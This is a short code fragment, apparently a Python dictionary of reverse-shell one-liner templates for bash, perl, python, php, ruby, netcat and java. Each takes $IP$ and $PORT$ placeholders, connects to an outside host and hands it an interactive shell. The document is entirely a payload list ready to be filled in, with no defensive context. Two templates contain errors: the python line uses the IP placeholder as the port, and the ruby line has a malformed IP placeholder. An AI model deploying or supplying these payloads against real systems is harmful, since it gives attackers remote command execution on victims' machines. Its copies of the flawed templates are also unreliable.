shells = {
    "bash" : "bash -i >& /dev/tcp/$IP$/$PORT$ 0>&1",

    "perl": "perl -e 'use Socket;$i=\"$IP$\";$p=$PORT$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",

    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP$\",$IP$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",

    "php" : "php -r '$sock=fsockopen(\"$IP$\",$PORT$);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT$).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

    "nc" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP$ $PORT$ >/tmp/f",

    "nc-2": "nc -e /bin/sh $IP$ $PORT$",

    "java": """r = Runtime.getRuntime()
            p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP$/$PORT$;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
            p.waitFor()""",

}